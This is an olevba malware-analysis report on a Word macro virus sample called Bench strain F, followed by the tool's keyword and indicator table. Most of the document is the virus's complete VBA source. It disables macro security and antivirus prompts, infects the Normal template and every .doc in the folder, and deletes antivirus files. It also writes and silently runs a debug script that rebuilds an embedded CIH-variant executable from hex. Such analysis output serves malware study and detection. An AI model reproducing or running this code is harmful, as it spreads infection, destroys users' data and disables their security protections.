olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.c-c128ba250752bb983e7639565e4f6ba3a6d47519
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.c-c128ba250752bb983e7639565e4f6ba3a6d47519 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BMVf.bas 
in file: Virus.MSWord.Bench.c-c128ba250752bb983e7639565e4f6ba3a6d47519 - OLE stream: 'Macros/VBA/BMVf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub BMVf() '[B]MV.f Module Infection - [Strain F of the [B]MV series!]
On Error Resume Next

If Application.Version = 9# Then ' two lines below from W2000M/PSD - I'll give VicodinES the credit for this!
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End If

If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If

SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal

ADInfected = False: NTInfected = False

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "BMVf" _
        Then
            ADInfected = True
    End If
Next I

For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "BMVf" _
        Then
            NTInfected = True
            Application.Caption = "-=([B]MV.F)=-"
            Application.StatusBar = "-=([Bench] Macro Virus - Strain F)=-"
    End If
Next j

If ADInfected = False And NTInfected = False Then GoTo BMVf

If ADInfected = False Then
    NormalTemplate.VBProject.VBComponents("BMVf").Export "c:\system.sys"
    ActiveDocument.VBProject.VBComponents.Import "c:\system.sys"
    Kill "c:\system.sys"
End If

If NTInfected = False Then
    ActiveDocument.VBProject.VBComponents("BMVf").Export "c:\system.sys"
    NormalTemplate.VBProject.VBComponents.Import "c:\system.sys"
    Kill "c:\system.sys"
End If

BMVf:
If (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileSave()
On Error Resume Next
Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
'kill "C:\program files\antiviral toolkit pro\avp.key"
            Application.Caption = "-=([B]MV.F])=-"
            Application.StatusBar = "-=([B]MV.F)=- / SAiNTS ViRii Dept. - Test Version"
ActiveDocument.Save
End Sub
Sub ViewVBCode()
On Error Resume Next

Call BMVf

With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[Bench] Macro Virus - F"
    .Text = "You're not permitted to go there! Now you're gonna pay!"
    .Animation = msoAnimationSearching
    .Show
End With

ActiveDocument.Password = "[Bench]"
ActiveDocument.Close Savechages:=wdSaveChanges

Kill "c:\program files\norton antivirus\Virscan2.dat"
Kill "c:\vdoc\*.*"
Kill "c:\f-prot\*.*"
' Kill "C:\program files\antiviral toolkit pro\*.*"
ActiveDocument.Save

Open "c:\TNN_CIH.SCR" For Output As #1
Print #1, "N TNN_CIH.COM"
Print #1, "E 0100 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00"
Print #1, "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
Print #1, "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
Print #1, "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
Print #1, "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F"
Print #1, "E 0160 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20"
Print #1, "E 0170 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00"
Print #1, "E 0180 50 45 00 00 4C 01 01 00 F1 68 20 35 00 00 00 00"
Print #1, "E 0190 00 00 00 00 E0 00 0F 01 0B 01 05 00 00 10 00 00"
Print #1, "E 01A0 00 00 00 00 00 00 00 00 10 10 00 00 00 10 00 00"
Print #1, "E 01B0 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"
Print #1, "E 01C0 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00"
Print #1, "E 01D0 00 20 00 00 00 02 00 00 00 00 00 00 02 00 00 00"
Print #1, "E 01E0 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00"
Print #1, "E 01F0 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0270 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00"
Print #1, "E 0280 00 10 00 00 00 10 00 00 00 10 00 00 00 02 00 00"
Print #1, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60"
Print #1, "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "E 0300 C3 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00"
Print #1, "E 0310 55 8D 44 24 F8 2B DB 64 87 03 E8 00 00 00 00 5B"
Print #1, "E 0320 8D 4B 42 51 50 50 0F 01 4C 24 FE 5B 83 C3 1C FA"
Print #1, "E 0330 8B 2B 66 8B 6B FC 8D 71 12 56 66 89 73 FC C1 EE"
Print #1, "E 0340 10 66 89 73 02 5E CC 56 8B F0 8B 48 FC F3 A4 83"
Print #1, "E 0350 E8 08 8B 30 0B F6 74 02 EB F0 5E CC FB 2B DB EB"
Print #1, "E 0360 07 2B DB 64 8B 03 8B 20 64 8F 03 58 5D 68 00 10"
Print #1, "E 0370 40 00 C3 74 32 0F 21 C1 E3 10 83 04 24 15 66 89"
Print #1, "E 0380 6B FC C1 ED 10 66 89 6B 02 CF 0F 23 C3 6A 0F 51"
Print #1, "E 0390 6A FF 51 51 51 6A 01 6A 02 CD 20 53 00 01 00 83"
Print #1, "E 03A0 C4 20 97 8D 46 9D CF 8D 87 E2 FC FF FF 50 CD 20"
Print #1, "E 03B0 67 00 40 00 0F 23 C0 58 8B 4E 3D 8B 11 89 50 FC"
Print #1, "E 03C0 8D 40 D6 89 01 FA EB B6 53 E8 00 00 00 00 5B 83"
Print #1, "E 03D0 C3 24 53 CD 20 68 00 40 00 58 FF 74 24 08 FF 53"
Print #1, "E 03E0 FC 59 50 53 FF 53 FC 59 0F 23 C0 58 5B C3 00 00"
Print #1, "E 03F0 00 00 60 E8 00 00 00 00 5E 81 C6 18 03 00 00 F6"
Print #1, "E 0400 06 01 0F 85 06 02 00 00 8D 5C 24 28 83 3B 24 0F"
Print #1, "E 0410 85 F3 01 00 00 FE 06 83 C6 05 56 8A 43 04 3C FF"
Print #1, "E 0420 74 08 04 40 B4 3A 89 06 46 46 6A 00 6A 7F 8B 5B"
Print #1, "E 0430 10 8B 43 0C 83 C0 04 50 56 CD 20 41 00 40 00 83"
Print #1, "E 0440 C4 10 81 7C 06 FC 2E 45 58 45 5E 0F 85 B4 01 00"
Print #1, "E 0450 00 66 83 7B 18 01 0F 85 A9 01 00 00 66 B8 00 43"
Print #1, "E 0460 CD 20 32 00 40 00 0F 82 99 01 00 00 51 8B BE 4D"
Print #1, "E 0470 FD FF FF 8B 3F F6 C1 01 74 08 66 B8 01 43 2B C9"
Print #1, "E 0480 FF D7 2B C0 B4 D5 2B C9 2B D2 42 8B DA 43 FF D7"
Print #1, "E 0490 93 59 9C F6 C1 01 74 06 66 B8 01 43 FF D7 9D 0F"
Print #1, "E 04A0 82 60 01 00 00 56 9C 83 C6 7F 2B C0 B4 D6 8B E8"
Print #1, "E 04B0 6A 04 59 6A 3C 5A FF D7 8B 16 4A 8B C5 FF D7 81"
Print #1, "E 04C0 3E 00 50 45 00 0F 85 24 01 00 00 53 6A 00 6A 01"
Print #1, "E 04D0 52 57 0F 23 CC 50 8B C5 B1 52 83 C2 07 FF D7 8D"
Print #1, "E 04E0 42 22 50 8D 06 50 0F B7 46 0E 8D 54 10 12 B0 28"
Print #1, "E 04F0 8A 0E F6 E1 8D 76 32 50 52 56 41 51 C1 E1 03 51"
Print #1, "E 0500 03 C8 03 CA 2B 4E 1C F7 D1 41 51 91 8B 46 F0 03"
Print #1, "E 0510 46 FC 89 86 A8 FB FF FF 66 81 3C 24 B8 00 7C 7B"
Print #1, "E 0520 8B C5 FF D7 95 6A 04 59 52 8B 56 3C 83 C2 12 FF"
Print #1, "E 0530 D7 81 3E 6E 5A 69 70 74 67 5A 5B 5F 59 57 03 D5"
Print #1, "E 0540 52 03 EE 55 8D 44 3D FC 89 18 53 03 D7 52 8D BE"
Print #1, "E 0550 4A FB FF FF 57 89 56 CE 8D 56 D8 BD 00 04 00 00"
Print #1, "E 0560 EB 31 83 C2 28 8B 5A 10 2B 5A 08 76 2C 53 83 E8"
Print #1, "E 0570 08 89 18 8B 5A 14 03 5A 08 53 57 8B 5A 08 03 5A"
Print #1, "E 0580 0C 03 5E FC 89 58 04 8B 18 01 5A 08 81 4A 24 40"
Print #1, "E 0590 00 00 40 2B EB 76 0E 03 FB E2 C7 0F 21 CC EB 33"
Print #1, "E 05A0 83 C4 3C EB 4A 01 28 01 6C 24 08 2B DB 89 58 FC"
Print #1, "E 05B0 8D 86 9A FC FF FF B1 04 66 C7 00 CD 20 8B 94 8E"
Print #1, "E 05C0 62 FE FF FF 89 50 02 0F B6 94 31 61 FE FF FF 2B"
Print #1, "E 05D0 C2 E2 E5 0F 21 C8 8B 58 10 8B 38 59 E3 0D 8B F1"
Print #1, "E 05E0 B8 01 D6 00 00 5A 59 FF D7 EB F0 5B 58 F9 9C 2B"
Print #1, "E 05F0 C0 B4 D7 FF D7 9D 5E 8B DF 66 B8 03 43 8B 4E FC"
Print #1, "E 0600 8B 7E FE FF D3 FE 4E FB 61 0F 21 C0 FF 20 8B DC"
Print #1, "E 0610 FF 73 38 FF 53 24 59 89 43 1C 83 7B 28 24 75 06"
Print #1, "E 0620 8B 41 28 89 46 01 61 C3 00 3A 66 27 53 00 01 00"
Print #1, "E 0630 68 00 40 00 41 00 40 00 32 00 40 00 43 49 48 20"
Print #1, "E 0640 28 54 4E 4E 20 52 65 6D 69 78 29 20 77 72 69 74"
Print #1, "E 0650 74 65 6E 20 62 79 20 20 54 54 49 54 20 6F 66 20"
Print #1, "E 0660 54 41 54 55 4E 47 20 20 2D 2D 5B BD 5D 2D 2D 20"
Print #1, "E 0670 20 72 65 6D 69 78 65 64 20 62 79 20 56 69 63 6F"
Print #1, "E 0680 64 69 6E 45 53 20 20 2D 2D 5B BD 5D 2D 2D 20 20"
Print #1, "E 0690 54 68 65 20 4E 61 72 6B 6F 74 69 63 20 4E 65 74"
Print #1, "E 06A0 77 6F 72 6B 20 56 69 72 75 73 20 57 61 72 65 68"
Print #1, "E 06B0 6F 75 73 65 20 20 68 74 74 70 3A 2F 2F 75 73 65"
Print #1, "E 06C0 72 73 2E 73 6B 79 6E 65 74 2E 62 65 2F 73 6F 6D"
Print #1, "E 06D0 6E 75 73 2F 76 69 72 6E 6E 76 77 2E 68 74 6D 6C"
Print #1, "E 06E0 20 20 2D 2D 5B BD 5D 2D 2D 20 20 A9 56 69 63 92"
Print #1, "E 06F0 73 20 4E 6F 74 20 57 6F 72 6B 69 6E 92 20 57 69"
Print #1, "E 0700 74 68 20 41 20 46 75 6C 6C 20 44 65 63 6B 21 20"
Print #1, "E 0710 00"
Print #1, "RCX"
Print #1, "611"
Print #1, "W"
Print #1, "Q"
Close #1

Open "c:\Startv.bat" For Output Access Write As #1
Print #2, "@echo off"
Print #2, "c:\"
Print #2, "debug < TNN_CIH.scr > nul"
Print #2, "del TNN_CIH.scr"
Print #2, "ren TNN_CIH.Com TNN_CIH.EXE"
Print #2, "TNN_CIH.Exe"
Print #2, "del startv.bat"
Close #2
Shell ("c:\startv.bat"), vbHide

With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[B]MV.f"
    .Text = "I have just attempted to install the CIH virus on your system." & vbCr & "I just felt like warning you..."
    .Animation = msoAnimationGetAttentionMajor
    .Show
End With
    
End Sub
Sub AutoExit()
    On Error Resume Next
    Call BMVf
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call BMVf
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call BMVf
End If
Loop
Application.Quit
End Sub
Sub FileExit()
    On Error Resume Next
    Call BMVf
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call BMVf
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call BMVf
End If
Loop
Application.Quit
End Sub
Sub FileTemplates()
On Error Resume Next
Call BMVf
End Sub
Sub ToolsMacro()
On Error Resume Next
Call BMVf
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |TNN_CIH.SCR         |Executable file name                         |
|IOC       |Startv.bat          |Executable file name                         |
|IOC       |TNN_CIH.scr         |Executable file name                         |
|IOC       |TNN_CIH.EXE         |Executable file name                         |
|IOC       |TNN_CIH.Exe         |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

